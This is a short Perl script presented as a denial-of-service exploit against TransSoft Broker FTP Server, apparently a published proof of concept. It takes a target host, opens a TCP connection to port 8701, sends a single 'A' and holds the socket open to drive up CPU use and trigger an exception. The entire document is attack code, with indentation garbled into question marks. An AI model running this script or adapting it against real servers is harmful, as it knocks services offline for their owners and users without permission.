#!/usr/bin/perl -w
# TransSoft Broker FTP Server DoS (CPU usage and Exception)
#

use Socket;
if (not $ARGV[0]) {
? ? ? ? print qq~
? ? ? ? ? ? ? ? Usage: pfdos.pl < host>
? ? ? ? ~;
exit;}

$ip=$ARGV[0];
print "host: " . $ip . "\n\n";
sendexplt("A");
sub sendexplt {
?my ($pstr)=@_;
? ? ? ? $target= inet_aton($ip) || die("inet_aton
problems");
?socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')
||0) ||
?die("Socket problems\n");
?if(connect(S,pack "SnA4x8",2,8701,$target)){
?select(S);
? ? ? ? ? ? ? ? $|=1;
?print $pstr;
?sleep 100;
? ? ? ? ?close(S);
?} else { die("Can't connect...\n"); }
}

